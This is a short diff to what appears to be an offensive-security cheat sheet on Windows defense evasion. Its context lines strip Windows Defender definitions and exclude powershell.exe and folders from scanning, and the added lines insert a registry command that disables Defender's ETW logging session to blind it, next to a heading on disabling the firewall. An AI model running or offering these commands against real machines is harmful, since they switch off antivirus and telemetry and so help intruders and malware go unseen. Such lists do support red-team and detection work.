@@ -60,6 +60,9 @@ MpCmdRun.exe -RemoveDefinitions -All
 Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
 Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 Add-MpPreference -ExclusionPath C:\Video, C:\install
+
+# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
 ```
 
 ## Disable Windows Firewall
